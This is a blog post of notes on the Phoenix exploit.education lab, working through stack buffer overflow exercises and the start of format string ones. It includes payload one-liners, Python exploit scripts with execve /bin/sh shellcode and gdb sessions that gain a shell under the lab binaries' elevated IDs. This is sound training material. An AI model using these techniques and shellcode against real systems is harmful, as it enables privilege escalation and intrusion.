<!DOCTYPE html>
<html>
  <head>
    <title>Phoenix (exploit.education) notes – mmmds's blog</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <link rel="stylesheet" type="text/css" href="/style.css" />
  </head>


  <body>
	<div class="container">
        <header>
		<div>mmmds's blog</div>	
         	<nav>
            	<a href="/">posts</a>
				|
            	<a href="/projects/">projects</a>
				|
            	<a href="/about/">about</a>
        	</nav>
        </header>
      </div>
    </div>
    <div id="main" role="main" class="container">
      <article class="post">
 	<h1>Phoenix (exploit.education) notes</h1>
	<div><span class="post_list_date">2019-11-01</span></div>
 	<div class="entry">
   	<p><a href="https://exploit.education/phoenix/">exploit.education</a> is a way to learn exploit development and related topics. Phoenix machine is a set of exercises which covers basic vulnerabilities and exploitation techniques.</p>

<p>This post is a summary of my notes, it is not meant to be a step by step walkthrough.</p>

<h2 id="stack">Stack</h2>
<p>This part is focused on memory corruption made on a stack and how it can be abused.</p>

<h3 id="stack-zero">Stack Zero</h3>
<p>User input is copied from stdin to <code class="highlighter-rouge">locals.buffer</code> without any length limit. <code class="highlighter-rouge">buffer</code> is a fixed length array (64 elements).</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  gets(locals.buffer);
</code></pre></div></div>

<p>The goal is to overflow a buffer to alter another variable. It can be done by putting more than 64 bytes.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ python -c 'print "A" * 65' | /opt/phoenix/i486/stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
</code></pre></div></div>

<h3 id="stack-one">Stack One</h3>
<p>This exercise is similar to the previous one, but instead of just changing the variable, we need to set it to specific value.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  if (locals.changeme == 0x496c5962) {
</code></pre></div></div>
<p>As we provides exact data which overwrites stack, we need to specify it in a payload.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ /opt/phoenix/i486/stack-one `python -c 'print "A" * 64 + "\x62\x59\x6c\x49"'`
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre></div></div>

<h3 id="stack-two">Stack Two</h3>
<p>In this exercise the only change is that user input comes from environmental variable which may be surprising that it’s also user controllable.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ptr = getenv("ExploitEducation");
  [...]
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ ExploitEducation=`python -c 'print "A"*64 + "\x0a\x09\x0a\x0d"'` /opt/phoenix/i486/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre></div></div>

<h3 id="stack-three">Stack Three</h3>
<p>This exercise shows how overwriting a function pointer can be abused. We can set it any address we want and redirect the execution. Address of a desired function can by obtained with <code class="highlighter-rouge">objdump</code></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ objdump -d /opt/phoenix/i486/stack-three  | grep '&lt;complete_level&gt;'
08048535 &lt;complete_level&gt;:
user@phoenix-amd64:~$ echo `python -c 'print "a"*64 + "\x35\x85\x04\x08"'` | /opt/phoenix/i486/stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x8048535
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre></div></div>

<h3 id="stack-four">Stack Four</h3>
<p>This one is a little bit more complicated. We have to overwrite a return address which resides on the stack. It is required to use debugger to find a proper offset to reach this variable.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  disas start_level
[...]
   0x08048512 &lt;+13&gt;:  call   0x8048310 &lt;gets@plt&gt;
[...]
   0x08048535 &lt;+48&gt;:  ret
[...]
gef➤  b *start_level+13
Breakpoint 1 at 0x8048512
gef➤  b *start_level+48
Breakpoint 2 at 0x8048535
gef➤  r
Starting program: /opt/phoenix/i486/stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education

Breakpoint 1, 0x08048512 in start_level ()
gef➤  x/x $esp
0xffffd630: 0xffffd64c
gef➤  c
Continuing.
aaaa
and will be returning to 0x804855c

Breakpoint 2, 0x08048535 in start_level ()
gef➤  print/x $esp
$0 = 0xffffd69c
gef➤  print/d 0xffffd69c - 0xffffd64c
$1 = 80
</code></pre></div></div>
<p>We set breakpoints on instructions where it is easy to spot buffer’s address <code class="highlighter-rouge">0xffffd64c</code> and stack’s address in which return value is stored <code class="highlighter-rouge">0xffffd69c</code>. By subtracting we get a proper offset.
Last thing to find is a desired return address.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  print complete_level
$2 = {&lt;text variable, no debug info&gt;} 0x80484e5 &lt;complete_level&gt;
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@phoenix-amd64:/opt/phoenix/i486# echo `python -c 'print "a"*80 + "\xe5\x84\x04\x08"'` | ./stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x80484e5
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre></div></div>

<h3 id="stack-five">Stack Five</h3>
<p>Finally an exercise where we can execute own code. We will overwrite a return address like in the previous exercise, but this time with address to a shellcode.
At the beginning we need to find an offset.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ gdb /opt/phoenix/i486/stack-five
gef➤  disas start_level
   [...]
   0x08048498 &lt;+19&gt;:    call   0x80482c0 &lt;gets@plt&gt;
   [...]
   0x080484a2 &lt;+29&gt;:    ret
gef➤  b *start_level+19
Breakpoint 1 at 0x8048498
gef➤  b *start_level+29
Breakpoint 2 at 0x80484a2
gef➤  r
Starting program: /opt/phoenix/i486/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x08048498 in start_level ()
gef➤  x/x $esp
0xffffd0a0:     0xffffd0b0
gef➤  c
Continuing.
aaaa

Breakpoint 2, 0x080484a2 in start_level ()
gef➤  print/x $esp
$0 = 0xffffd13c
gef➤  print/d 0xffffd13c - 0xffffd0b0
$1 = 140
</code></pre></div></div>

<p>As we know the offset and buffer’s address, the last thing we need is a proper shellcode. A typical one will not work because <code class="highlighter-rouge">gets</code> function is in use. More details about this topic and proper shellcode:</p>
<ul>
  <li><a href="https://stackoverflow.com/questions/50305475/exploit-development-gets-and-shellcode">https://stackoverflow.com/questions/50305475/exploit-development-gets-and-shellcode</a></li>
  <li><a href="http://shell-storm.org/shellcode/files/shellcode-219.php">http://shell-storm.org/shellcode/files/shellcode-219.php</a></li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total_len = 140
payload = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
payload += "A" * (total_len-len(payload))
payload += "\xb0\xd0\xff\xff"
print payload
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ python five.py | /opt/phoenix/i486/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
$ id
uid=1000(user) gid=1000(user) euid=505(phoenix-i386-stack-five) egid=505(phoenix-i386-stack-five) groups=505(phoenix-i386-stack-five),27(sudo),1000(user)
</code></pre></div></div>

<h3 id="stack-six">Stack Six</h3>

<p>The last stack exercise required more effort. This application reads value from <code class="highlighter-rouge">ExploitEducation</code> environmental variable and joins it with a text from <code class="highlighter-rouge">GREET</code> macro. Process of copying is vulnerable to buffer overflow because <code class="highlighter-rouge">maxSize</code> passed to <code class="highlighter-rouge">strncpy</code> is incorrectly calculated. At first, <code class="highlighter-rouge">buffer</code> is filled with <code class="highlighter-rouge">what</code> string using <code class="highlighter-rouge">strcpy</code> function. Then, user controllable value is copied to the further space in <code class="highlighter-rouge">buffer</code>, but when <code class="highlighter-rouge">maxSize</code> is calculated it’s not taken into account that value will be placed after non-zero offset. User controllable value will overflow a buffer by number of bytes equal to the length of <code class="highlighter-rouge">what</code> string.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  strcpy(buffer, what);
  strncpy(buffer + strlen(buffer), who, maxSize);
</code></pre></div></div>

<p>At the beginning we would like to know what is overwritten on the stack by our excessive data.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ ExploitEducation=`python -c 'print "A"*200'`
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/stack-six
gef➤  disas greet
[...]
   0x080485eb &lt;+102&gt;:	push   eax
   0x080485ec &lt;+103&gt;:	call   0x80483b0 &lt;strncpy@plt&gt;
   0x080485f1 &lt;+108&gt;:	add    esp,0x10
[...]
gef➤  b *greet+103
Breakpoint 1 at 0x80485ec
gef➤  r
Starting program: /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education

Breakpoint 1, 0x080485ec in greet ()

gef➤  x/x $esp
0xffffd4f0:	0xffffd51a
gef➤  x/x $esp+8
0xffffd4f8:	0x0000007f
</code></pre></div></div>
<p><code class="highlighter-rouge">esp</code> keeps output buffer’s address. <code class="highlighter-rouge">esp+8</code> stores how many bytes (0x7f == 127) will be copied by <code class="highlighter-rouge">strncpy</code>.</p>

<p>After one step (calling <code class="highlighter-rouge">strncpy</code>) we look at output buffer. Data from input ends on <code class="highlighter-rouge">0xffffd598</code> which is also address kept by <code class="highlighter-rouge">ebp</code> register. It appears that we can control one byte in <code class="highlighter-rouge">ebp</code>.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  n
gef➤  x/36x 0xffffd51a
0xffffd51a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd52a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd53a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd54a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd55a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd56a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd57a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd58a:	0x41414141	0x41414141	0x41414141	0xd5414141
0xffffd59a:	0x865fffff	0xdec80804	0x0000ffff	0x00000000

gef➤  x/x $ebp
0xffffd598:	0xffffd541
</code></pre></div></div>

<p>Continuing we finally reach to interesting part which will allow us to alter execution path:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$eax   : 0x0
$ebx   : 0x41414141
$ecx   : 0xffffd520
$edx   : 0x0       
$esp   : 0xffffd5b0
$ebp   : 0xffffd541
$esi   : 0xffffd654 

 →  0x8048673 &lt;main+104&gt;       mov    ecx, DWORD PTR [ebp-0x4]
    0x8048676 &lt;main+107&gt;       leave
    0x8048677 &lt;main+108&gt;       lea    esp, [ecx-0x4]
    0x804867a &lt;main+111&gt;       ret

gef➤  n
</code></pre></div></div>

<p><code class="highlighter-rouge">4</code> is subtracted from <code class="highlighter-rouge">ebp</code>, then it’s treated as a pointer to a value which is set to <code class="highlighter-rouge">ecx</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$eax   : 0x0        
$ebx   : 0x41414141 
$ecx   : 0xe0000000 
$edx   : 0x0        
$esp   : 0xffffd5b0 
$ebp   : 0xffffd541 
$esi   : 0xffffd654

gef➤  x/2x 0xffffd541-4
0xffffd53d:	0xe0000000	0x00f7ffb1

 →  0x8048676 &lt;main+107&gt;       leave
    0x8048677 &lt;main+108&gt;       lea    esp, [ecx-0x4]
    0x804867a &lt;main+111&gt;       ret

gef➤  n
</code></pre></div></div>

<p>This line really doesn’t matter, as it changes <code class="highlighter-rouge">esp</code> and <code class="highlighter-rouge">ebp</code> will be discarded soon.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$eax   : 0x0        
$ebx   : 0x41414141 
$ecx   : 0xe0000000 
$edx   : 0x0        
$esp   : 0xffffd545 
$ebp   : 0xf7ffb1   
$esi   : 0xffffd654

 →  0x8048677 &lt;main+108&gt;       lea    esp, [ecx-0x4]
    0x804867a &lt;main+111&gt;       ret

 gef➤  n
</code></pre></div></div>

<p>Next, <code class="highlighter-rouge">4</code> is subtracted from <code class="highlighter-rouge">ecx</code>, and set to <code class="highlighter-rouge">esp</code> - this value becomes a new stack pointer.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$eax   : 0x0        
$ebx   : 0x41414141 
$ecx   : 0xe0000000 
$edx   : 0x0        
$esp   : 0xdffffffc 
$ebp   : 0xf7ffb1   
$esi   : 0xffffd654

gef➤  x/x 0xdffffffc
0xdffffffc:	Cannot access memory at address 0xdffffffc

 →  0x804867a &lt;main+111&gt;       ret

 gef➤  n
</code></pre></div></div>

<p>The application crashes trying to read from <code class="highlighter-rouge">esp</code> (<code class="highlighter-rouge">0xdffffffc</code>) which is inaccessible address,
but if it had succeed it would have taken an address from the stack and jumped to it.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Program received signal SIGSEGV, Segmentation fault.
0x0804867a in main ()
</code></pre></div></div>

<p>Let’s find better value for <code class="highlighter-rouge">ebp</code> which we may set in range <code class="highlighter-rouge">0xffffd500</code> - <code class="highlighter-rouge">0xffffd5ff</code></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/100x 0xffffd500
0xffffd500:	0x00000099	0xf7ffb1e0	0x00000002	0xf7fb5ce8
0xffffd510:	0x08049930	0x00000098	0xf7ffb1e0	0x00000099
0xffffd520:	0xf7ffc228	0x00000098	0xffffd56f	0x00000001
0xffffd530:	0x41414141	0x41414141	0xf7fb79f5	0x0000000a
0xffffd540:	0xf7ffb1e0	0x00000000	0xffffd541	0xf7fb5ab8
0xffffd550:	0xf7ffb1e0	0xffffd56f	0x00000001	0x0000000a
0xffffd560:	0x08049930	0x41414141	0x41414141	0x0afb7038
0xffffd570:	0xf7fb5a5b	0xf7ffb000	0xf7ffb1e0	0xf7fb8958
0xffffd580:	0xf7ffb1e0	0x0000000a	0x00000000	0x00000000
0xffffd590:	0x41414141	0xffffd654	0x00000001	0x0804866b
0xffffd5a0:	0x08049930	0x00000000	0x00000000	0x00000000
0xffffd5b0:	0x00000000	0x00000000	0x00000000	0xffffdec8
0xffffd5c0:	0x00000000	0xffffd5e0	0xffffd65c	0xf7f8f654
0xffffd5d0:	0xffffd654	0x00000001	0xffffd65c	0xf7f8f654
0xffffd5e0:	0x00000001	0xffffd654	0xffffd65c	0x00000008
0xffffd5f0:	0x00000011	0x00000000	0xf7f8f628	0xf7ffb000
</code></pre></div></div>
<p>Let’s say we want to point <code class="highlighter-rouge">ebp - 0x4</code> (look at <code class="highlighter-rouge">main+104</code>) to address <code class="highlighter-rouge">0xffffd564</code>, so <code class="highlighter-rouge">ebp</code> should be <code class="highlighter-rouge">0xffffd568</code>. It can be achieved by setting the last byte to <code class="highlighter-rouge">0x68</code>. We also know that the whole buffer is 127 bytes long (from a third param passed to <code class="highlighter-rouge">strcpy</code>).</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ export ExploitEducation=`python -c 'print "A"*126 + "\x68" + "A"*(200-126-1)'`
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/stack-six
gef➤  b *main+107
Breakpoint 1 at 0x8048676
gef➤  r


$eax   : 0x0        
$ebx   : 0x41414141 
$ecx   : 0x41414141 
$edx   : 0x0        
$esp   : 0xffffd5b0 
$ebp   : 0xffffd568 
$esi   : 0xffffd654
 →  0x8048676 &lt;main+107&gt;       leave
</code></pre></div></div>
<p>It shows that we control <code class="highlighter-rouge">ecx</code> and we can put our value in it, but now we need to know what part of the payload is there.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  pattern create 126
[+] Generating a pattern of 126 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabga

user@phoenix-amd64:~$ export ExploitEducation=`python -c 'print "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabga" + "\x68" + "A"*(200-126-1)'`
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/stack-six

gef➤  b *main+107
Breakpoint 1 at 0x8048676
gef➤  r
Starting program: /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome home, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgah���_����

Breakpoint 1, 0x08048676 in main ()

$ecx   : 0x61746161

gef➤  pattern search $ecx 126
[+] Searching '$ecx'
[+] Found at offset 74 (little-endian search) likely
[+] Found at offset 75 (big-endian search)
</code></pre></div></div>

<p>Moving from one-liner to python script:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total = 200
ebp_offset = 126
ebp = "\x68"
addr_offset = 74
addr = "BBBB"

p = "A" * addr_offset
p += addr
p += "A" * (ebp_offset - len(p))
p += ebp
p += "A" * (total - len(p))

print p
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ export ExploitEducation=`python six.py`
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/stack-six
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  b *main+107
Breakpoint 1 at 0x8048676
gef➤  r
Starting program: /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome home, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAh���_����

Breakpoint 1, 0x08048676 in main ()

$ecx   : 0x42424242
</code></pre></div></div>

<p>We know that <code class="highlighter-rouge">ecx-4</code> becomes a new stack pointer and function returns to an address taken from the stack. So now we need to point <code class="highlighter-rouge">esp</code> to our data.</p>

<p>Address of payload beginning may be found this way:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  b *main+46
Breakpoint 2 at 0x8048639
gef➤  r
Starting program: /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education

Breakpoint 2, 0x08048639 in main ()

gef➤  print $eax
$1 = (void *) 0xffffdec8
</code></pre></div></div>

<p>So we put this address in script (remember about 4 bytes to be subtracted)</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total = 200
ebp_offset = 126
ebp = "\x68"
addr_offset = 74
addr = "\xcc\xde\xff\xff" # 0xffffdec8 + 4 = 0xffffdecc

p = "A" * addr_offset
p += addr
p += "A" * (ebp_offset - len(p))
p += ebp
p += "A" * (total - len(p))

print p
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ export ExploitEducation=`python six.py`
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/stack-six
gef➤  b *main+111
Breakpoint 1 at 0x804867a
gef➤  r
Starting program: /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome home, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAh���_����

Breakpoint 1, 0x0804867a in main ()

gef➤  print $esp
$1 = (void *) 0xffffdec8

gef➤  n
0x41414141 in ?? ()
gef➤  print $eip
$2 = (void (*)()) 0x41414141
</code></pre></div></div>

<p>We moved control to address which we control, but we need to move control to our code. We know the address of the beginning from which value <code class="highlighter-rouge">0x41414141</code> was taken (<code class="highlighter-rouge">0xffffdec8</code>). So our payload should start from the next 4 bytes (<code class="highlighter-rouge">0xffffdecc</code>).</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total = 200
ebp_offset = 126
ebp = "\x68"
addr_offset = 74
addr = "\xcc\xde\xff\xff"

shellcode = "\xcc" * 32

p = "\xcc\xde\xff\xff"
p += shellcode
p += "A" * (addr_offset - len(p))
p += addr
p += "A" * (ebp_offset - len(p))
p += ebp
p += "A" * (total - len(p))

print p

user@phoenix-amd64:~$ export ExploitEducation=`python six.py`
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/stack-six
gef➤  r
Starting program: /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome home, ������������������������������������AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAh���_����

Program received signal SIGTRAP, Trace/breakpoint trap.
0xffffdecd in ?? ()

 → 0xffffdecd                  int3
   0xffffdece                  int3
   0xffffdecf                  int3
   0xffffded0                  int3
   0xffffded1                  int3
   0xffffded2                  int3
   0xffffded3                  int3
   0xffffded4                  int3
   0xffffded5                  int3
   0xffffded6                  int3
   0xffffded7                  int3
   0xffffded8                  int3
</code></pre></div></div>

<p>It’s proof that we can move control to our payload. Now it’s time to test real shellcode, taken from:</p>
<ul>
  <li><a href="http://shell-storm.org/shellcode/files/shellcode-827.php">http://shell-storm.org/shellcode/files/shellcode-827.php</a></li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total = 200
ebp_offset = 126
ebp = "\x68"
addr_offset = 74
addr = "\xcc\xde\xff\xff"

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

p = "\xcc\xde\xff\xff"
p += shellcode
p += "A" * (addr_offset - len(p))
p += addr
p += "A" * (ebp_offset - len(p))
p += ebp
p += "A" * (total - len(p))

print p
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ export ExploitEducation=`python six.py`
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/stack-six
gef➤  r
Starting program: /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome home, ����1�Ph//shh/bin��PS��
                                      ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAh���_����
process 488 is executing new program: /bin/dash
warning: Could not load shared library symbols for linux-vdso.so.1.
Do you need "set solib-search-path" or "set sysroot"?
$
</code></pre></div></div>

<p>It works, shell is spawned. It’s time to test it without debugger.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome home, ����1�Ph//shh/bin��PS��
                                      ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAh���_����
Segmentation fault
</code></pre></div></div>

<p>It crashes so we need to adjust addresses, because debugger sets slightly different environmental variables. It can be done by analysis of core dump.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ sudo sh -c 'echo 2 &gt; /proc/sys/fs/suid_dumpable'
user@phoenix-amd64:~$ ulimit -c unlimited

user@phoenix-amd64:~$ /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome home, ��������������������1�Ph//shh/bin��PS��
                                                      ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����_����
Segmentation fault (core dumped)

user@phoenix-amd64:~$ gdb -c /var/lib/coredumps/core.stack-six.11.336
gef➤  x/100x 0xffffd500
0xffffd500:	0x0000007f	0xffffd674	0x00000001	0x08048603
0xffffd510:	0xf7f81cf7	0xf7ffb1e0	0xffffd540	0xf7fb5cf1
0xffffd520:	0x00000099	0xf7ffb1e0	0x00000002	0xf7fb5ce8
0xffffd530:	0x08049930	0x00000098	0xf7ffb1e0	0x00000099
0xffffd540:	0xf7ffc228	0x00000098	0xffffd58f	0x00000001
0xffffd550:	0xcd0bb0e1	0x41414180	0xf7fb79f5	0x0000000a
0xffffd560:	0xf7ffb1e0	0x00000000	0xffffd568	0xf7fb5ab8
0xffffd570:	0xf7ffb1e0	0xffffd58f	0x00000001	0x0000000a
0xffffd580:	0x08049930	0xffffdecc	0x41414141	0x0afb7038
</code></pre></div></div>
<p>We can see that our address appears on <code class="highlighter-rouge">0xffffd584</code> instead of <code class="highlighter-rouge">0xffffd564</code>, so we need to change <code class="highlighter-rouge">ebp</code> from <code class="highlighter-rouge">x68</code> to <code class="highlighter-rouge">x88</code>.
Next is beginning of our data which is at <code class="highlighter-rouge">0xffffdeaa</code> instead of <code class="highlighter-rouge">0xffffdec8</code>.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/100x 0xffffdec8-30
0xffffdeaa:	0xffffdecc	0x6850c031	0x68732f2f	0x69622f68
0xffffdeba:	0x50e3896e	0xb0e18953	0x4180cd0b	0x41414141
0xffffdeca:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdeda:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdeea:	0x41414141	0x41414141	0xdecc4141	0x4141ffff
0xffffdefa:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdf0a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdf1a:	0x41414141	0x41414141	0x41414141	0x41684141
0xffffdf2a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdf3a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdf4a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdf5a:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdf6a:	0x41414141	0x41414141	0x474f4c00	0x454d414e
</code></pre></div></div>

<p>Adjusted script:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total = 200
ebp_offset = 126
ebp = "\x88"
addr_offset = 74
addr = "\xae\xde\xff\xff" # 0xffffdeaa + 4 = 0xffffdeae

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

p = "\xae\xde\xff\xff"
p += shellcode
p += "A" * (addr_offset - len(p))
p += addr
p += "A" * (ebp_offset - len(p))
p += ebp
p += "A" * (total - len(p))

print p
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ export ExploitEducation=`python six.py`
user@phoenix-amd64:~$ /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome home, ����1�Ph//shh/bin��PS��
                                      ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB����_����
$ id
uid=1000(user) gid=1000(user) euid=506(phoenix-i386-stack-six) egid=506(phoenix-i386-stack-six) groups=506(phoenix-i386-stack-six),27(sudo),1000(user)
</code></pre></div></div>

<h2 id="format">Format</h2>
<p>This part is about string formatting vulnerabilities. All information required to successfully finish exercises:</p>
<ul>
  <li><a href="https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf">https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf</a></li>
</ul>

<h3 id="format-zero">Format Zero</h3>
<p>Vulnerability occurs because user input is used as format string and formatting result is written into a fixed length buffer (32 bytes)</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  struct {
    char dest[32];
    volatile int changeme;
  } locals;
[...]
sprintf(locals.dest, buffer);
</code></pre></div></div>

<p>The goal is to alter <code class="highlighter-rouge">locals.changeme</code> by memory corruption. It can be done by specifying a number with a fixed length which would overflow the buffer.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ /opt/phoenix/i486/format-zero
Welcome to phoenix/format-zero, brought to you by https://exploit.education
%031x
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
user@phoenix-amd64:~$ /opt/phoenix/i486/format-zero
Welcome to phoenix/format-zero, brought to you by https://exploit.education
%032x
Well done, the 'changeme' variable has been changed!
</code></pre></div></div>

<h3 id="format-one">Format One</h3>
<p>In this exercise instead of just altering the <code class="highlighter-rouge">locals.changeme</code>, it is required to set it to <code class="highlighter-rouge">0x45764f6c</code> value. It may be achieved just by writing specific bytes at the end of the input buffer.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Uh oh, 'changeme' is not the magic value, it is 0x41413034
